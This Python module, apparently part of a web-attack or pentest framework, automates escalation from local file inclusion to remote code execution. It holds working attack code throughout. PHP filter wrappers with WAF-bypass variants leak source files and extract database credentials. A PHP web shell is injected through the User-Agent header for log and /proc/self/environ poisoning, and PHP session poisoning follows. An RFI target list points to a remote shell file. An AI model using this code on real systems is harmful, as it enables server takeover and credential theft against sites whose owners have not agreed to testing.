"""
LFI→RCE Exploitation Chain — from file read to command execution.

Methods:
1. PHP filter chain — base64-encode source files, decode for source code leak
2. Log poisoning — inject PHP via User-Agent into Apache/Nginx access logs
3. /proc/self/environ — extract environment via procfs (USER_AGENT header)
4. PHP session poisoning — inject into PHPSESSID file
5. RFI probe — if LFI works, try remote include
"""
import asyncio
import base64
import re
import time
from core.ui import w


class LFItoRCE:
    """LFI exploitation chain — escalate file read to code execution."""

    def __init__(self, engine, session_manager=None):
        self.engine = engine
        self.session_manager = session_manager

    # PHP Filter Chain

    FILTER_TARGETS = [
        "index.php", "config.php", "wp-config.php", "app.php", "main.py",
        ".env", "database.php", "db.php", "settings.php", "application.py",
    ]

    FILTER_WRAPPERS = [
        "php://filter/convert.base64-encode/resource=",
        "php://filter/read=convert.base64-encode/resource=",
        "php://filter/convert.base64-encode|convert.base64-encode/resource=",  # double-encode WAF bypass
        "pHp://fIlter/convert.base64-encode/resource=",  # case variation
    ]

    # Log Poisoning

    LOG_PATHS = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/apache/access.log",
        "/var/log/apache/error.log",
        "../logs/access.log",
        "../../logs/access.log",
        "/proc/self/fd/2",  # stderr
    ]

    # /proc/self/environ

    PROC_PATHS = [
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
    ]

    # PHP Session Poisoning

    SESSION_PATHS = [
        "/tmp/sess_",
        "/var/lib/php/sessions/sess_",
        "/var/lib/php/session/sess_",
        "/var/tmp/sess_",
    ]

    # RFI Targets

    RFI_TARGETS = [
        "http://127.0.0.1:80/shell.txt",
        "http://127.0.0.1:8080/shell.txt",
        "https://raw.githubusercontent.com/username/shell/main/cmd.php",
    ]

    async def _send_lfi(self, base_url: str, param: str, traversal: str,
                         timeout: int = 8) -> dict:
        """Send LFI payload appended to base URL or injected into param."""
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

        # If URL has params, inject; otherwise append as path
        parts = urlparse(base_url)
        if parts.query:
            query = parse_qsl(parts.query, keep_blank_values=True)
            for i, (k, v) in enumerate(query):
                if k == param:
                    query[i] = (k, traversal)
                    break
            else:
                query.append((param, traversal))
            target = urlunparse((parts.scheme, parts.netloc, parts.path,
                                 urlencode(query), parts.fragment))
        else:
            target = base_url.rstrip("/") + "/" + traversal

        return await self.engine.ahttp_send(target, timeout=timeout,
                                             state_context=self.session_manager)

# Phase 1: PHP Filter Chain — Source Code Leak

    async def php_filter_chain(self, base_url: str, param: str) -> list[dict]:
        """Attempt to read source files via PHP filter wrappers."""
        findings = []
        markers = [r"<\?php", r"PDO", r"\$db", r"mysql_connect", r"mysqli",
                   r"DB_HOST", r"DB_NAME", r"SECRET_KEY", r"APP_KEY", "define("]

        for target_file in self.FILTER_TARGETS:
            for wrapper in self.FILTER_WRAPPERS[:2]:  # first 2 only for speed
                traversal = wrapper + target_file
                try:
                    r = await self._send_lfi(base_url, param, traversal, timeout=8)
                    if not isinstance(r, dict):
                        continue
                    body = (r.get("body") or "")[:2000]
                    status = r.get("status", 0)

                    if status == 200 and body and len(body) > 20:
                        # Try to decode base64
                        try:
                            decoded = base64.b64decode(body.strip()).decode("utf-8", "replace")
                            if any(marker.lower() in decoded.lower() for marker in markers):
                                # Extract DB creds from decoded source
                                creds = self._extract_creds(decoded)
                                findings.append({
                                    "type": "lfi_source_leak",
                                    "title": f"LFI→Source: {target_file}",
                                    "url": base_url[:200],
                                    "detail": f"Param: {param}, File: {target_file}, "
                                              f"Decoded: {len(decoded)} bytes" +
                                              (f", Creds: {creds}" if creds else ""),
                                    "param": param,
                                    "confidence": "confirmed" if creds else "suspected",
                                })
                                # If we got creds, no need to try more files
                                if creds:
                                    return findings
                        except Exception:
                            # Not base64 — maybe raw PHP already
                            if "<?php" in body[:500]:
                                findings.append({
                                    "type": "lfi_source_leak",
                                    "title": f"LFI→Source: {target_file} (raw PHP)",
                                    "url": base_url[:200],
                                    "detail": f"Param: {param}, File: {target_file}, Raw PHP output",
                                    "param": param,
                                    "confidence": "confirmed",
                                })
                except Exception as e:
                    w(f"LFI source leak request failed for {target_file}: {str(e)[:60]}")
                    continue

        return findings

    def _extract_creds(self, source: str) -> str:
        """Extract DB credentials from PHP source."""
        patterns = [
            r"(?:DB_HOST|DB_NAME|DB_USER|DB_PASS(?:WORD)?|APP_KEY|SECRET)\s*[=:]\s*['\"]([^'\"]+)['\"]",
            r"\$(?:db_host|db_name|db_user|db_pass(?:word)?)\s*=\s*['\"]([^'\"]+)['\"]",
        ]
        found = []
        for pat in patterns:
            for m in re.findall(pat, source, re.I):
                if m not in found:
                    found.append(m)
        return ", ".join(found[:4]) if found else ""

# Phase 2: Log Poisoning → RCE

    async def log_poisoning(self, base_url: str, param: str) -> list[dict]:
        """Inject PHP shell via User-Agent, then include poisoned log file."""
        findings = []
        php_shell = "<?php system($_GET['cmd']);?>"
        marker = "VERDAMT_POISON_" + str(int(time.time()))

        # Step 1: Send request with poisoned User-Agent
        try:
            # We need to send a request that gets logged by the server
            # The User-Agent header carries the PHP payload
            await self.engine.ahttp_send(
                base_url,
                headers={"User-Agent": f"{php_shell} <!--{marker}"},
                timeout=5,
                state_context=self.session_manager,
            )
        except Exception as e:
            w(f"Log poisoning request failed: {str(e)[:60]}")

        # Step 2: Try to include poisoned log files and execute command
        test_cmd = "id"
        for log_path in self.LOG_PATHS[:6]:  # top 6 most common
            traversal = f"{log_path}?cmd={test_cmd}"
            try:
                r = await self._send_lfi(base_url, param, traversal, timeout=10)
                if not isinstance(r, dict):
                    continue
                body = (r.get("body") or "")[:2000]
                status = r.get("status", 0)

                # Check if our command executed
                rce_markers = [r"uid=\d+\(\w+\)", r"gid=\d+\(\w+\)", r"groups=\d+"]
                if status == 200 and any(re.search(m, body) for m in rce_markers):
                    findings.append({
                        "type": "lfi_rce_log_poison",
                        "title": f"LFI→RCE: Log Poisoning via {log_path}",
                        "url": base_url[:200],
                        "detail": f"Param: {param}, Log: {log_path}, "
                                  f"Command 'id' executed — full RCE achieved",
                        "param": param,
                        "method": "log_poisoning",
                        "confidence": "confirmed",
                    })
                    return findings  # RCE confirmed, stop
            except Exception as e:
                w(f"Log poisoning inclusion failed for {log_path}: {str(e)[:60]}")
                continue

        # Step 3: Try /proc/self/environ (USER_AGENT is in environ)
        if not findings:
            proc_findings = await self._proc_environ(base_url, param)
            findings.extend(proc_findings)

        return findings

    async def _proc_environ(self, base_url: str, param: str) -> list[dict]:
        """Try /proc/self/environ for RCE via User-Agent in environment."""
        findings = []
        # Inject the payload with a new marker so we can identify our request
        marker = "VDMT_PROBE"
        shell = f"<?php system('id');?>"
        try:
            await self.engine.ahttp_send(
                base_url,
                headers={"User-Agent": f"{shell}{marker}"},
                timeout=5,
                state_context=self.session_manager,
            )
        except Exception as e:
            w(f"proc_environ injection request failed: {str(e)[:60]}")

        for proc_path in self.PROC_PATHS:
            try:
                r = await self._send_lfi(base_url, param, proc_path, timeout=8)
                if not isinstance(r, dict):
                    continue
                body = (r.get("body") or "")[:2000]
                status = r.get("status", 0)

                # /proc/self/environ includes HTTP_USER_AGENT
                # If we see our marker + uid output, RCE is confirmed
                if status == 200 and marker in body:
                    if any(x in body for x in ["uid=", "gid=", "www-data", "apache"]):
                        findings.append({
                            "type": "lfi_rce_proc_environ",
                            "title": "LFI→RCE: /proc/self/environ Poisoning",
                            "url": base_url[:200],
                            "detail": f"Param: {param}, Path: {proc_path}, "
                                      f"RCE via User-Agent in process environment",
                            "param": param,
                            "method": "proc_environ",
                            "confidence": "confirmed",
                        })
                        break
            except Exception as e:
                w(f"proc_environ path check failed for {proc_path}: {str(e)[:60]}")
                continue

        return findings

# Phase 3: PHP Session Poisoning

    async def session_poisoning(self, base_url: str, param: str) -> list[dict]:
        """Poison PHP session file via controlled input, then include session."""
        findings = []
        php_code = "<?php system('id');?>"

        # Step 1: Send PHP code in a parameter that might get stored in session
        poison_params = ["username", "user", "name", "email", "search", "q", "comment"]
        for pp in poison_params:
            try:
                from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
                parts = urlparse(base_url)
                query = parse_qsl(parts.query, keep_blank_values=True)
                poison_url = urlunparse((parts.scheme, parts.netloc, parts.path,
                                         urlencode([(pp, php_code)]), parts.fragment))
                r = await self.engine.ahttp_send(poison_url, timeout=5,
                                                  state_context=self.session_manager)
                if isinstance(r, dict) and r.get("status", 0) > 0:
                    # Extract PHPSESSID from response
                    cookies = r.get("headers", {}).get("set-cookie", "")
                    sess_match = re.search(r"PHPSESSID=(\w+)", cookies)
                    if sess_match:
                        sess_id = sess_match.group(1)
                        for sess_dir in self.SESSION_PATHS[:2]:
                            sess_path = f"{sess_dir}{sess_id}"
                            try:
                                r2 = await self._send_lfi(base_url, param, sess_path, timeout=8)
                                body = (r2.get("body") or "")[:2000] if isinstance(r2, dict) else ""
                                if "uid=" in body or "gid=" in body:
                                    findings.append({
                                        "type": "lfi_rce_session_poison",
                                        "title": "LFI→RCE: Session Poisoning",
                                        "url": base_url[:200],
                                        "detail": f"Param: {param}, Session: {sess_path}, "
                                                  f"Poisoned via '{pp}' parameter",
                                        "param": param,
                                        "method": "session_poisoning",
                                        "confidence": "confirmed",
                                    })
                                    return findings
                            except Exception as e:
                                w(f"session check failed for {sess_path}: {str(e)[:60]}")
                                continue
            except Exception as e:
                w(f"session poisoning session-write attempt failed for {pp}: {str(e)[:60]}")
                continue

        return findings

# Full Chain

    async def exploit(self, base_url: str, param: str) -> list[dict]:
        """Full LFI→RCE chain: filter chain → log poison → session poison."""
        if not base_url or not param:
            return []

        findings = []

        # Phase 1: Source code leak (fast, high-value)
        source_findings = await self.php_filter_chain(base_url, param)
        findings.extend(source_findings)

        # Phase 2: Log poisoning → RCE (most reliable)
        rce_findings = await self.log_poisoning(base_url, param)
        findings.extend(rce_findings)

        # Phase 3: Session poisoning (if log poisoning failed)
        if not rce_findings:
            sess_findings = await self.session_poisoning(base_url, param)
            findings.extend(sess_findings)

        return findings
